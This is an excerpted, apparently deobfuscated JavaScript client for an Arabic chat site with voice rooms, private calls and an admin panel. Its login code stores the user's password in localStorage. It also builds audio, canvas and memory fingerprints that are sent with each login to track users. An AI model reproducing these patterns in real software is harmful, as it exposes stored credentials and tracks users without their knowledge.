  ...
  function connectVoiceToUser(targetUser) {
    ...
    peerConnections['_' + targetUser.id].on("error", function (err) {
      ...
      setTimeout(function () {
        ...
        if (activeUser != null && activeUser.roomid == myroom && mic.indexOf(myid) != -0x1) {
      ...
      'config': {
        ...
        'iceServers': [{
          ...
          switch (0x1) {
            ...
            case 0x2:
            case 0x4:
              return server.urls.indexOf("tcp") != -0x1 || server.urls.indexOf("stun") != -0x1;
            case 0x3:
            case 0x5:
              return server.urls.indexOf('udp') != -0x1 || server.urls.indexOf("stun") != -0x1;
            case 0x6:
              return server.urls.indexOf("openrelay") != -0x1 || server.urls.indexOf("stun") != -0x1;
          }
          return true;
        })
      }
...
window.addEventListener("message", function (event) {
  ...
  if (chatPermissionsCookie == null && eventData[0x0] == "con") {
    if (eventData[0x1] != myid) {
  ...
  if (chatPermissionsCookie && location.pathname == "/cp") {
    if (eventData[0x0] == 'con') {
      executeControlPanelAction("login", {
        'msg': 'ok',
        'id': eventData[0x1][0x7]
      });
      window.onbeforeunload = null;
      chatEmojisList = eventData[0x1][0x4];
      groupIcons = eventData[0x1][0x5];
      activeBansList = eventData[0x1][0x6];
      ...
      executeControlPanelAction("powers", eventData[0x1][0x2]);
      executeControlPanelAction("rlist", eventData[0x1][0x1]);
      executeControlPanelAction("ulist", eventData[0x1][0x0]);
      executeControlPanelAction("power", eventData[0x1][0x3]);
      return;
    }
    executeControlPanelAction(eventData[0x0], eventData[0x1]);
  } else {
...
function makeElementDraggable(element) {
  ...
  function dragElement(e) {
    ...
    try {
      var touch = (e.touches || [])[0x0];
      var clientX = Math.max(0x0, (touch || e).clientX);
      var clientY = Math.max(0x0, (touch || e).clientY);
      posX = initialX - clientX;
      posY = initialY - clientY;
      initialX = clientX;
      initialY = clientY;
      element.style.top = Math.min(window.innerHeight - element.clientHeight, Math.max(0x0, element.offsetTop - posY)) + 'px';
      element.style.left = Math.min(window.innerWidth - element.clientWidth, Math.max(0x0, element.offsetLeft - posX)) + 'px';
    } catch (err) {}
    return true;
  }
...
function logout() {
  send("logout", {});
  redirectWindowDelay(0x1f4);
}
function sendbc(isDelayed, alternativeBox, inputSelector) {
  if (inputSelector && 0x0 && allUsersList[myid].rep < 0x0) {
...
function getSanitizedReferrer() {
  ...
  if (domainReferrer.indexOf("http://" + location.hostname) == 0x0) {
    return '';
  }
  if (domainReferrer.indexOf("://") != -0x1) {
    domainReferrer = domainReferrer.replace(/(.*?)\:\/\//g, '').split('/')[0x0];
  }
  return domainReferrer;
}
function updateLazyImagesAndSortRooms() {
  if (isSidebarMenuOpen && $("#dpnl:visible").find("#users.active,#rooms.active").length > 0x0) {
    closeSidebarPanel();
  ...
  if (shouldRefreshRoomsList && $("#dpnl:visible").find("#rooms.active").length) {
    ...
    sortRoomsBound(function (roomA, roomB) {
      var visitorsCountA = parseInt(roomA.getAttribute('v') || 0x0);
      var visitorsCountB = parseInt(roomB.getAttribute('v') || 0x0);
      ...
      return visitorsCountA < visitorsCountB ? 0x1 : -0x1;
    });
  ...
  setInterval(function () {
    if (shouldScrollDownForce || isScrollActive) {
      ...
      if (isScrollActive) {
        ...
        if (offsetDiff > 0xa) {
          document.documentElement.scrollTop = offsetDiff / 0x2;
        }
        chatMessagesArea.scrollTop(chatMessagesArea[0x0].scrollHeight);
      } else {
        isScrollActive = true;
      }
    }
    if (isBroadcastScrollTop == true && broadcastArea.scrollTop == 0x0) {
...
var globalTempText = '';
function checkDeviceWidthAndInitialize(data) {
  ...
  $('#u1').val(decodeURIComponent(getStorageItemValue('u1')));
  $("#u2").val(decodeURIComponent(getStorageItemValue('u2')));
  $("#pass1").val(decodeURIComponent(getStorageItemValue('p1')));
  ...
  var configValue = getStorageItemValue("zoom");
  if (configValue == '') {
    configValue = '1';
    setStorageItemValue("zoom", configValue);
  }
  if (isNaN(parseInt(configValue)) == false && configValue != '1') {
    $("#zoom").val(configValue).trigger("change");
    triggerScrollUpdate();
  }
  configValue = getStorageItemValue("bitrate");
  if (configValue == '') {
    configValue = '24';
    setStorageItemValue("bitrate", configValue);
  }
  if (isNaN(parseInt(configValue)) == false && configValue != '24') {
    $("#turn_bitrate").val(configValue).trigger("change");
  }
  configValue = getStorageItemValue("turn_server");
  if (configValue == '') {
    configValue = '1';
    setStorageItemValue("turn_server", configValue);
  }
  if (isNaN(parseInt(configValue)) == false && configValue != '1') {
    $("#turn_server").val(configValue).trigger("change");
  }
  if (getStorageItemValue("isl") == "yes") {
  ...
  if (chatPermissionsCookie) {
    ...
    colorPaletteList.forEach(function (baseColor) {
      ...
      colorShades.push(generateColorShade(baseColor, 0xf));
    ...
    window.cldiv = colorBoxContainer[0x0].outerHTML;
  ...
  validateBrowserSessionTime();
}
function validateBrowserSessionTime() {
  var storedSessionTime = getStorageItemValue('pr') || '';
  globalChatConfig = parseInt(window.name) || parseInt(storedSessionTime) || 0x0;
  if (globalChatConfig == 0x0) {
    globalChatConfig = new Date().getTime();
  }
  window.name = globalChatConfig + '';
  setStorageItemValue('pr', globalChatConfig + '');
  return new Date().getTime() - globalChatConfig > 10800000 ? globalChatConfig : 0x0;
}
function decryptCommand(cipherText) {
  var charArray = (cipherText || '').split('');
  var arrayLength = charArray.length;
  for (var i = 0x0; i < arrayLength; i++) {
    charArray[i] = String.fromCharCode(cipherText.charCodeAt(i) ^ 0x2);
...
var reconnectionAttempts = 0x0;
var isOverlayLoginActive = false;
function handleDisconnectFallback() {
  if (isRoomLocked) {
    return;
  }
  triggerScrollUpdate(0x1);
  reconnectionAttempts++;
  if (myid != null && userSessionToken != null && reconnectionAttempts <= 0x6) {
    isReconnecting = true;
...
function scrollBodyToInput(inputElement) {
  ...
  var inputTopPosition = $(inputElement).position().top - (document.body.scrollHeight - window.innerHeight) - 0xa;
...
function updateOnlineUsersList(usersData, actionType) {
  ...
  if (typeof usersData == "string" && usersData.indexOf('[') != -0x1) {
  ...
  var baselineTemplate = userTemplateHtml[0x0].outerHTML;
  ...
  if (actionType == 0x0) {
    ...
    for (var i = 0x0; i < usersArray.length; i++) {
  ...
  if (actionType == 0x1) {
    ...
    if ((userObj.ico || '') != '') {
      ...
      finalTotalCount = (parseInt($("#s1").text()) || 0x0) + 0x1;
    } else {
  ...
  $.each(formSelector.find("input"), function (index, inputElement) {
    switch ($(inputElement).attr('type')) {
      ...
      case "checkbox":
        ...
        break;
      case "number":
        extractedDataMap[$(inputElement).attr("name")] = parseInt($(inputElement).val(), 0xa);
        break;
    }
  });
...
function setStorageItemValue(key, value) {
...
function getStorageItemValue(key) {
  if (typeof Storage !== "undefined") {
    var storedValue = '';
    try {
...
function getFallbackCookieValue(cookieName) {
  ...
  for (var i = 0x0; i < cookiesArray.length; i++) {
    var singleCookie = cookiesArray[i];
    while (singleCookie.charAt(0x0) == " ") {
      singleCookie = singleCookie.substring(0x1);
    }
    if (singleCookie.indexOf(namePrefix) != -0x1) {
      return decodeURIComponent(singleCookie.substring(namePrefix.length, singleCookie.length));
    }
  }
  return '';
}
function triggerScrollUpdate(dummyParam) {
  shouldScrollDownForce = true;
}
...
function updateRoomMicsStatus() {
  ...
  var isRoomOperator = currentRoomObj && currentRoomObj.ops && currentRoomObj.ops.indexOf(allUsersList[myid].lid) != -0x1;
  
  // حلقة تكرار للمرور على المايكات الخمسة المتاحة بالشات
  for (var micIndex = 0x0; micIndex < 0x5; micIndex++) {
    ...
    if (isMicOccupied) {
      ...
      micElement.find("img")[0x0].src = getUserIconPath(micUserObj);
        ...
        micElement.off().click(function () {
          ...
          setTimeout(function () {
            ...
            if (userPermissionsConfig.mic || isRoomOperator) {
              ...
              if (currentMicUser == 0x0) {
                contextMenuOptions.push("تفعيل المايك");
              } else {
                contextMenuOptions.push("قفل المايك");
              }
            }
            if (contextMenuOptions.length == 0x1) {
              openUserProfileSlider(currentMicUser);
            } else {
      ...
      micElement.off().click(function () {
        ...
        setTimeout(function () {
          ...
          if (contextMenuOptions.length == 0x1 && currentMicUser != 0x0) {
            toggleMicrophoneAction(currentMicIdx);
          } else {
            openContextMenu(clickedMicBtn, contextMenuOptions, function (selectedOption) {
              switch (selectedOption) {
                case "قفل المايك":
...
function analyzeAudioLevel(audioCtxInstance, streamSource, callback) {
  var scriptProcessor = audioCtxInstance.createScriptProcessor(0x800, 0x1, 0x1);
  ...
  scriptProcessor.onaudioprocess = function (audioProcessingEvent) {
    var channelData = audioProcessingEvent.inputBuffer.getChannelData(0x0);
    var bufferLength = channelData.length;
    var totalAmplitude = i = 0x0;
    var rmsVolume;
...
function toggleMicrophoneAction(micIndexParam) {
  if (isMutedAll || mic.indexOf(myid) != -0x1) {
    micIndexParam = -0x1;
  }
  if (micIndexParam > -0x1 && localAudioStream == null) {
    localAudioStream = {};
...
function buildEmojiBoxPanel() {
  var emojiImagesHtml = '';
  for (var i = 0x0; i < chatEmojisList.length; i++) {
    emojiImagesHtml += "<img style=\"margin:2px;\" class=\"emoi\" src=\"emo/" + chatEmojisList[i] + "\" title=\"" + (i + 0x1) + "\" onclick=\"pickedemo(this);\">";
  }
  var emojiContainerNode = $("<div style='width:300px;background-color:#fafafa;' class='break'></div>");
  emojiContainerNode[0x0].innerHTML = emojiImagesHtml;
...
function handlePrivateCallAction(targetUserId, actionType) {
  ...
  switch (actionType) {
    case "call":
      ...
      requestMicrophonePermission({
        ...
        callBoxWindow.find(".u-pic").css("background-image", "url('" + targetUserObj.pic + "')").parent().off().click(function () {
          openUserProfileSlider(targetUserId);
    ...
    case "calling":
      ...
      if (isUserIgnoredOrBlocked(allUsersList[targetUserId])) {
        send("call", {
          't': "call",
          't': 'x',
          'id': targetUserId
      ...
      if (false && $('#c' + targetUserId).length == 0x0) {
        send("nopm", {
          'id': targetUserId
        });
        send("call", {
      ...
      openPrivateChatWindow(targetUserId, false);
      ...
      privateMessageArea.scrollTop(privateMessageArea[0x0].scrollHeight);
  ...
  try {
    if (chatPermissionsCookie == null) {
      if (sessionIdContext) {
        ...
        if (userPermissionsConfig[commandName] || commandName.indexOf('cp_') == 0x0) {
    ...
    switch (commandName) {
      ...
      case 'p2':
        ...
        var peerConnectionInstance = peerConnections[commandPayload.dir != 0x1 ? '_' + commandPayload.id : commandPayload.id];
        switch (commandPayload.t) {
          ...
          case "signal":
            ...
            if (peerConnectionInstance != null) {
              ...
              for (var i = 0x0; i < signalDataArray.length; i++) {
          ...
          case 'x':
            if (peerConnectionInstance != null) {
              ...
              delete peerConnections[commandPayload.dir != 0x1 ? '_' + commandPayload.id : commandPayload.id];
            }
            break;
        }
        break;
      ...
      case 'uh':
        ...
        var tableRowsHtml = '';
        for (var i = commandPayload.length - 0x1; i != -0x1; i--) {
          ...
          tableRowsHtml += buildTableRowHtml([logItem.u, logItem.t, logItem._ip, new Date(new Date().getTime() - logItem.c).getTime().time(), userPermissionsConfig.cp ? searchFpBtnHtml : ''], [0x50, 0x78, 0x50, 0x50, 0x28]);
...
case "server":
  ...
  (function () {
    ...
    function setupContextInstance() {
      ...
      offlineAudioCtx = new OfflineAudioContextClass(0x1, 0xac44, 0xac44);
    }
    ...
    function buildCompressor() {
      ...
      setCompressorParameter("attack", 0x0);
    ...
    function extractBufferData(audioBufferEvent) {
      ...
      for (var i = 0x1194; 0x1388 > i; i++) {
        var channelSample = audioBufferEvent.renderedBuffer.getChannelData(0x0)[i];
  ...
  break;
case "online":
  updateOnlineUsersList(commandPayload, 0x0);
  break;
case "online+":
  updateOnlineUsersList(commandPayload, 0x1);
  break;
case "online-":
  updateOnlineUsersList(commandPayload, -0x1);
  break;
...
case "emos":
  ...
  selectedEmojiObject = {};
  for (var i = 0x0; i < chatEmojisList.length; i++) {
    selectedEmojiObject['ف' + (i + 0x1)] = chatEmojisList[i];
  }
  setTimeout(function () {
    buildEmojiBoxPanel();
  }, 0x3e8);
...
case 'rcd':
  ...
  for (var i = 0x0; i < combinedQueueData.length; i++) {
    executeControlPanelAction(combinedQueueData[i][0x0], combinedQueueData[i][0x1]);
  }
  break;
case 'mv':
  var micUserIndex = mic.indexOf(commandPayload[0x0]);
  if (micUserIndex != -0x1) {
    commandPayload[0x1] = Math.min(0x1, commandPayload[0x1] * 1.4);
    $("#mic" + micUserIndex).css("outline", "2px solid rgba(111, 200, 111, " + Math.max(0x0, Math.ceil(commandPayload[0x1] * (commandPayload[0x1] < 0.05 ? 0x0 : 0x64) / 0x5) * 0x5 * 0.0255) + ')');
  }
  break;
case "login":
  ...
  switch (commandPayload.msg) {
    case 'ok':
      ...
      setInterval(() => {
        try {
          ...
          if (myid != null && isReconnecting == false && activeChatTabWindow != null && currentPrivateUser != null) {
            ...
            var currentTextLength = visibleTextArea.length > 0x0 ? visibleTextArea.val().length : 0x0;
            
            // إذا كان المستخدم يكتب نصاً حالياً ولم يتم إرسال إشارة "يكتب حالياً" بعد
            if (visibleTextArea.length > 0x0 && currentTextLength > 0x0 && typingStateTracker != 0x1) {
              typingStateTracker = 0x1;
              if (lastTypingStateKey != currentPrivateUser + '_' + 0x1) {
                lastTypingStateKey = currentPrivateUser + '_' + 0x1;
                send('ty', [currentPrivateUser, 0x1]); // إرسال إشارة البدء بالكتابة ty للسيرفر
              }
            } else {
              // إذا مسح المستخدم النص أو توقف تماماً عن الكتابة
              if (currentTextLength == 0x0 && typingStateTracker != 0x0) {
                typingStateTracker = 0x0;
                if (lastTypingStateKey != currentPrivateUser + '_' + 0x0) {
                  lastTypingStateKey = currentPrivateUser + '_' + 0x0;
                  send('ty', [currentPrivateUser, 0x0]); // إرسال إشارة التوقف عن الكتابة للسيرفر
                }
              }
            }
          }
      ...
      $(window).on("resize", function () {
        ...
        if (calculatedWidth != currentSidebarWidth) {
          ...
          dpnl[0x0].style.width = calculatedWidth;
        }
      });
      ...
      setStorageItemValue("token", userAuthHash); // حفظ توكين الجلسة المشفر في الـ LocalStorage
    ...
    case 'reg':
      ...
      $('#u2').val($("#u3").val());
      $("#pass1").val($("#pass2").val());
      switchLoginTabs(0x2); // التحويل التلقائي لتبويب تسجيل الدخول بعد نجاح التسجيل reg
      break;
  }
  break;
case "powers":
  activeAlerts = commandPayload;
  for (var i = 0x0; i < activeAlerts.length; i++) {
  ...
  if (currentUserObj != null) {
    ...
    if (userPermissionsConfig.publicmsg > 0x0) {
      $(".pmsg").show();
    } else {
      $(".pmsg").hide();
    }
    ...
    executeAdditionalPermissionsSetup();
  }
  
  // تحديث قائمة المتواجدين بناءً على تحديث الصلاحيات
  for (var i = 0x0; i < ignoredUsersList.length; i++) {
...
case 'rops':
  ...
  if (commandPayload.indexOf(myid) != -0x1) {
...
case "power":
  ...
  var hasExistingPermissions = Object.keys(userPermissionsConfig).length != 0x0;
...
case "not":
  ...
  if (commandPayload.user != null && commandPayload.force != 0x1 && false) {
    send("nonot", {
  ...
  if (senderUserObj != null) {
    if (isUserIgnoredOrBlocked(senderUserObj)) {
  ...
  globalAlertOffsetTracker += 0x2;
  if (globalAlertOffsetTracker >= 0x6) {
    globalAlertOffsetTracker = 0x0;
  }
...
case "bc^":
  ...
  if (likeHeartIcon.length > 0x0) {
    likeHeartIcon.text((parseInt(likeHeartIcon.text()) || 0x0) + 0x1); // زيادة عداد اللايكات بالمنشور العام +1
  }
  likeHeartIcon = $("#rpl .bid" + commandPayload.bid + " .fa-heart").first();
  if (likeHeartIcon.length > 0x0) {
    likeHeartIcon.text((parseInt(likeHeartIcon.text()) || 0x0) + 0x1); // زيادة عداد اللايكات في صندوق الردود المفتوح +1
  }
  break;
...
case 'mi+':
  ...
  if (messageHeartIcon.length > 0x0) {
    messageHeartIcon.text((parseInt(messageHeartIcon.text()) || 0x0) + 0x1); // زيادة اللايك على الرسالة بالعام +1
  }
  messageHeartIcon = $("#rpl .mi" + commandPayload + " .fa-heart").first();
  if (messageHeartIcon.length > 0x0) {
    messageHeartIcon.text((parseInt(messageHeartIcon.text()) || 0x0) + 0x1); // زيادة اللايك على الرسالة في قائمة الردود +1
  }
  break;
case "ops":
...
case 'pm':
  ...
  if (isUserIgnoredOrBlocked(allUsersList[commandPayload.uid])) {
    return; // التخطي فوراً إذا كان مرسل الرسالة الخاصة في قائمة تجاهلك
  }
  if (commandPayload.force != 0x1 && false && $('#c' + commandPayload.pm).length == 0x0) {
    send("nopm", {
  ...
  openPrivateChatWindow(commandPayload.pm, false);
...
case "msg":
  ...
  if (msgSenderUserObj != null && isUserIgnoredOrBlocked(msgSenderUserObj)) {
...
case "ulist":
  ...
  for (var i = 0x0; i < totalUsersCount; i++) {
    var logItem = ignoredUsersList[i];
  ...
  var lazyAppendTimer = setInterval(() => {
    if (tempElementsQueue.length) {
      var splicedChunk = tempElementsQueue.splice(0x0, 0x64).filter(function (filteredNode) {
        return filteredNode.dl == null;
      });
      $("#users").append(splicedChunk); // إدراج الأعضاء في حاوية الواجهة الرئيسية #users
    }
    if (tempElementsQueue.length == 0x0) {
      ...
      for (var j = 0x0; j < ignoredUsersList.length; j++) {
  ...
  var targetRoomObj;
  for (var i = 0x0; i < chatRoomsArray.length; i++) {
    targetRoomObj = chatRoomsArray[i];
    targetRoomObj.ht.attr('v', targetRoomObj.uco || 0x0).find(".uc").html(targetRoomObj.uco + '/' + targetRoomObj.max);
  }
  break;
case "u++":
...
case 'u-':
  ...
  for (var i = 0x0; i < ignoredUsersList.length; i++) {
    if (ignoredUsersList[i].id == commandPayload) {
      ignoredUsersList.splice(i, 0x1);
      break;
    }
  }
  removeUserFromSidebarUi(commandPayload);
  $("#busers").text($.grep(ignoredUsersList, function (singleUser) {
    return singleUser.s == null;
  }).length);
...
case 'ur':
  ...
  var movingUserId = commandPayload[0x0];
  var destinationRoomId = commandPayload[0x1];
  ...
  } else if (mic.indexOf(movingUserId) != -0x1) {
    updateRoomMicsStatus();
  }
  break;
case 'u^':
  ...
  if (Object.keys(commandPayload).length == 0x2 && commandPayload.rep != null) {
    return;
  }
...
case 'r^':
  ...
  var isMicNewlyGranted = mic.indexOf(myid) == -0x1 && commandPayload.m.indexOf(myid) != -0x1;
  var isMicForcefullyRemoved = mic.indexOf(myid) != -0x1 && commandPayload.m.indexOf(myid) == -0x1;
  ...
  if (commandPayload.id == myroom) {
    ...
    if (isMicForcefullyRemoved) {
      for (var connectionId in peerConnections) {
        if (connectionId.indexOf('_') == 0x0) { // اتصالات البث الصوتي المباشر للأعضاء
...
case "rlist":
  ...
  for (var i = 0x0; i < totalRoomsCount; i++) {
...
case "cp_bots":
  ...
  $.each(commandPayload, function (index, botObj) {
    ...
    var botRowNode = insertRowIntoTable(botsTableNode, [botObj.stat == 0x0 ? "متصل" : '', botObj.co || '--', botObj.topic, botObj.msg, formatNumberWithCommas(botObj.rep || 0x0) + '', anchoredRoomObj ? anchoredRoomObj.topic : '', botConfigBtnHtml], [0x8c, 0x78, 0x78, 0x78, 0x3c, 0x50]);
  ...
  $("#cp .tablesorter").each(function (tableIdx, tableElement) {
    $(tableElement).find('tr').each(function (rowIdx, rowElement) {
      if (rowIdx / 0x2 == Math.ceil(rowIdx / 0x2)) {
...
case "cp_rooms":
  ...
  $.each(commandPayload, function (index, adminRoomObj) {
    ...
    insertRowIntoTable(roomsTableNode, [adminRoomObj.topic, adminRoomObj.user, roomSettingsBtnHtml], [0x8c, 0x78, 0x78]);
  });
...
case "cp_owner":
  ...
  $(".wall_likes").val(commandPayload.site.wall_likes || 0x0);     // لايكات كتابة منشور حائط
  $(".wall_minutes").val(commandPayload.site.wall_minutes || 0x0); // دقائق الانتظار بين منشورين
  $(".pmlikes").val(commandPayload.site.pmlikes || 0x0);           // لايكات فتح خاص مع الأعضاء
  $(".msgstt").val(commandPayload.site.msgst || 0x0);
  $(".notlikes").val(commandPayload.site.notlikes || 0x0);         // لايكات إرسال تنبيهات
  $(".fileslikes").val(commandPayload.site.fileslikes || 0x0);     // لايكات رفع ونقل الملفات والصور
  $(".proflikes").val(commandPayload.site.proflikes || 0x0);       // لايكات تعديل الحساب الشخصي
  $(".piclikes").val(commandPayload.site.piclikes || 0x0);         // لايكات تغيير صورة البروفايل
  
  // قيود الشبكة والاتصال
  $(".maxIP").val(commandPayload.site.maxIP || 0x2);               // الحد الأقصى لفتح حسابات من نفس الآيبي IP
  $(".maxshrt").val(commandPayload.site.maxshrt || 0x1);           // تكرار الاختصارات
  $(".stay").val(commandPayload.site.stay || 0x1);
  ...
  $(".callsLike").val(commandPayload.site.callsLike || 0x0);       // لايكات تفعيل المكالمات الصوتية الخاصة
  
  // تحديث وتلوين واجهة الشات وسيمات الألوان الإدارية باستخدام مكتبة jscolor
  var colorPickerInstance = new jscolor.color($("#cp .sbg")[0x0], {});
  colorPickerInstance.fromString(commandPayload.site.bg);
  colorPickerInstance = new jscolor.color($(".sbackground")[0x0], {});
  colorPickerInstance.fromString(commandPayload.site.background);
  colorPickerInstance = new jscolor.color($(".sbuttons")[0x0], {});
  ...
  if (masterIconsArray != null && masterIconsArray.length > 0x0) {
    for (var k = 0x0; k < masterIconsArray.length; k++) {
  ...
  $.each(commandPayload.emo, function (index, emoFileName) {
    var emoElementNode = $("<div style=\"display:inline-block;padding:2px;margin:2px;margin-top:2px;\" class=\"border\"><input style=\"width:48px;\" type=\"number\" value=\"" + (index + 0x1) + "\" onchange=\"emo_order();\"><img style=\"max-width:24px;max-height:24px;\"><a style=\"margin-left: 4px;padding:4px;\" onclick=\"del_ico(this);\" class=\"btn btn-danger fa fa-times\">.</a></div>");
...
case "ico+":
  ...
  var specialIconsContainer = $(".p-" + pathSegments[0x0]); // تحديد الحاوية تلقائياً (emo أو sico أو dro3)
  
  if (pathSegments[0x0] == "emo") {
...
case "cp_msgs":
  ...
  $.each(commandPayload, function (index, msgConfigObj) {
    ...
    insertRowIntoTable(msgsTableNode, [msgConfigObj.type == 'w' ? "الترحيب" : "الرسائل", msgConfigObj.t, msgConfigObj.m, deleteMsgBtnHtml], [0x5a, 0x8c, 0x118, 0x50]);
  });
...
case "cp_subs":
  ...
  commandPayload = commandPayload.sort(function (subA, subB) {
    return ('[' + parseUserPowerString(subB.power).rank.toString().padStart(0x4, '0') + "] " + subB.power).localeCompare('[' + parseUserPowerString(subA.power).rank.toString().padStart(0x4, '0') + "] " + subA.power);
  });
  
  $.each(commandPayload, function (index, subUserObj) {
    // احتساب الأيام المتبقية لانتهاء اشتراك الرتبة VIP
    if (subUserObj.end > 0x0) {
      subUserObj.end = Math.ceil((subUserObj.end - currentTimestamp) / 86400000) - 0x1;
    }
    ...
    subsTableRowsHtml += buildTableRowHtml([
      '[' + parseUserPowerString(subUserObj.power).rank.toString().padStart(0x4, '0') + "] " + subUserObj.power, 
      subUserObj.user, 
      subUserObj.topic, 
      subUserObj.days, 
      subUserObj.end == 0x0 ? '' : subUserObj.end.toString().padStart(0x2, '0'), 
      subUserObj.ls.toFixed(0x0).toString().padStart(0x2, '0'), 
      subActionsBtnHtml
...
case "cp_shrt":
  ...
  $.each(commandPayload, function (index, shortcutObj) {
    ...
    insertRowIntoTable(shortcutsTableNode, [shortcutObj.name, shortcutObj.value, deleteShortcutBtnHtml], [0x50, 0x190, 0x50]);
  });
...
case "cp_fltr":
  ...
  $.each(commandPayload.a, function (index, filterObj) {
    ...
    insertRowIntoTable(filterTableNode, [filterObj.type, filterObj.v, deleteFilterBtnHtml], [0x5a, 0x12c, 0x50]);
  });
  ...
  $("#fltred").html('');
  for (var i = commandPayload.b.length - 0x1; i != -0x1; i--) {
...
case "cp_bans":
  ...
  $.each(commandPayload, function (index, banItemObj) {
    ...
    insertRowIntoTable(bansTableNode, [banItemObj.user, banItemObj.type, banItemObj.date, banItemObj.co, banItemObj.lc, banActionsBtnHtml], [0x50, 0xbe, 0x78, 0x54]);
  });
...
case "cp_logins":
  ...
  var paginationData = commandPayload[commandPayload.length - 0x1];
  commandPayload.splice(commandPayload.length - 0x1, 0x1); // إزالتها للاحتفاظ ببيانات الحسابات فقط
  ...
  $.each(commandPayload, function (index, accountObj) {
    ...
    var regMonth = parsedRegDate.getMonth() + 0x1;
    ...
    insertRowIntoTable(loginsTableNode, [
      ...
      formatNumberWithCommas(accountObj.rep),                          // إجمالي لايكات السمعة
  ...
  $("#logins .fa-arrow-right").text((paginationData.i + 0x64).toString()).attr("onclick", "send('cp',{cmd:'logins',q:$('#logins input').val(),i:" + (paginationData.i + 0x64) + "});$('#logins .fa').attr('disabled',true);").removeAttr("disabled");
  $("#logins .fa-arrow-left").text(Math.max(0x0, paginationData.i).toString()).attr("onclick", "send('cp',{cmd:'logins',q:$('#logins input').val(),i:" + Math.max(0x0, paginationData.i - 0x64) + "});$('#logins .fa').attr('disabled',true);");
  
  if (paginationData.i > 0x0) {
...
case "cp_fps":
  ...
  var fpsPaginationData = commandPayload[commandPayload.length - 0x1];
  commandPayload.splice(commandPayload.length - 0x1, 0x1);
  ...
  $.each(commandPayload, function (index, fpItemObj) {
    ...
    insertRowIntoTable(fpsTableNode, [
  ...
  $("#fps .fa-arrow-left").text(Math.max(0x0, fpsPaginationData.i).toString()).attr("onclick", "send('cp',{cmd:'fps',q:$('#fps input').val(),i:" + Math.max(0x0, fpsPaginationData.i - 0xc8) + "});$('#fps .fa').attr('disabled',true);");
  
  if (fpsPaginationData.i > 0x0) {
...
case "cp_actions":
  ...
  var actionsPaginationData = commandPayload[commandPayload.length - 0x1];
  commandPayload.splice(commandPayload.length - 0x1, 0x1);
  ...
  $.each(commandPayload, function (index, actionLogObj) {
    ...
    insertRowIntoTable(actionsTableNode, [
  ...
  $("#actions .fa-arrow-left").text(Math.max(0x0, actionsPaginationData.i).toString()).attr("onclick", "send('cp',{cmd:'actions',q:$('#actions input').val(),i:" + Math.max(0x0, actionsPaginationData.i - 0xc8) + "});$('#actions .fa').attr('disabled',true);");
  
  if (actionsPaginationData.i > 0x0) {
...
case "cp_domains":
  ...
  domainSelectMenu.off().on("change", function (event) {
    ...
    var domainColorPicker = new jscolor.color($("#cp .domain_sbg")[0x0], {});
    domainColorPicker.fromString(selectedDomainObj ? selectedDomainObj.bg : "#39536E");
    
    domainColorPicker = new jscolor.color($("#cp .domain_sbackground")[0x0], {});
    domainColorPicker.fromString(selectedDomainObj ? selectedDomainObj.background : "#fafafa");
    
    domainColorPicker = new jscolor.color($("#cp .domain_sbuttons")[0x0], {});
...
var globalAlertOffsetTracker = 0x0;
...
function generateColorShade(hexColor, shadeAmount) {
  try {
    return (hexColor.indexOf('#') == 0x0 ? '#' : '') + hexColor.replace(/^#/, '').replace(/../g, doubleHexChar => ('0' + Math.min(0xff, Math.max(0x0, parseInt(doubleHexChar, 0x10) + shadeAmount)).toString(0x10)).substr(-0x2));
  } catch (e) {
    return "#000000";
  }
}
...
function switchLoginTabs(actionTypeCode) {
  ...
  if (isLoginActionTriggered == false) {
    ...
    if (getStorageItemValue("refr") == '') {
      setStorageItemValue("refr", getSanitizedReferrer() || '*');
    }
    if (getStorageItemValue('r') == '') {
      setStorageItemValue('r', getCookieValue('r') || '*');
    }
    ...
    try {
      navigator.n = navigator.n || {};
      navigator.n.pri = validateBrowserSessionTime();
      ...
      navigator.n.ear = executeAudioFingerprintEngine();
      navigator.n.mjs = window && window.performance && window.performance.memory ? window.performance.memory.jsHeapSizeLimit : 0x1; // حجم ذاكرة الكاش المتاحة للمتصفح
...
function executeGdFingerprint() {
  try {
    var canvasElement = document.createElement("canvas");
    canvasElement.style.display = "none";
    canvasElement.width = 0x0;
    canvasElement.height = 0x0;
    var canvasContext = canvasElement.getContext('2d');
    var canvasHash = hashFingerprintString(canvasElement.toDataURL());
    canvasElement.remove();
    typeof canvasContext;
...
for (var i = 0x0; i < ncolors.length; i++) {
...
window.cldiv = colorGridContainer[0x0].outerHTML;
...
cachedMessageHtmlTemplate = $($("#umsg").html()).addClass('mm')[0x0].outerHTML;
...
$(".ae").click(function (event) {
  setTimeout(function () {
    ...
    $("#tbox").keyup(function (keyEvent) {
      if (keyEvent.keyCode == 0xd) {
        ...
        sendMessageAction(); // دالة معالجة وإرسال نص الرسالة للعام
      }
    });
    ...
    setInterval(executePeriodicCheck, 15000); // 0x3a98 تعني 15 ثانية
    ...
    setTimeout(function () {
      switchLoginTabs(actionTypeCodeParam);
    }, 320);
    return;
  }
  ...
  switch (actionTypeCodeParam) {
    case 0x1:
      // الحالة الأولى: الدخول كزائر (Guest) وإرسال البصمة وحفظ الاسم في الـ LocalStorage
      send('g', {
        'username': $("#u1").val(),
        'fp': navigator.n,
        'refr': getStorageItemValue("refr"),
        'r': getStorageItemValue('r')
      });
      setStorageItemValue('u1', encodeURIComponent($("#u1").val()).split("'").join("%27"));
      setStorageItemValue("isl", 'no'); // وضع علامة عدم الدخول بعضوية
      break;
    ...
    case 0x2:
      ...
      send("login", {
        'username': $('#u2').val(),
        'stealth': $("#stealth").is(":checked"), // خيار التخفي المستخرج من فحصك
        'password': $("#pass1").val(),
        'fp': navigator.n,
        'refr': getStorageItemValue('refr'),
        'r': getStorageItemValue('r')
      });
      setStorageItemValue('u2', encodeURIComponent($("#u2").val()).split("'").join("%27"));
      setStorageItemValue('p1', encodeURIComponent($("#pass1").val()).split("'").join("%27"));
      setStorageItemValue("isl", "yes"); // وضع علامة الدخول بعضوية
      break;
...
function changeElementBootstrapClass(elementSelector, bootstrapClass) {
  ...
  targetElement.classList.remove(targetElement + "-warning");
...
function showNotificationToast(alertTypeClass, messageText) {
  changeElementBootstrapClass("#loginstat", alertTypeClass).innerText = messageText;
}
...
function compileUserRowHtml(userId, userObj, returnNodeOnly) {
  ...
  userObj.h = '#' + Math.ceil((Math.ceil(Math.sqrt(parseInt(executeHashAlgorithm([userObj.username || 'ff'], 0x200), 0x24) / 0xfe01)) - 0x1) / 0xff * 0x63).toString().padStart(0x2, '0');
  ...
  userNode[0x0].className += " uid" + userId;
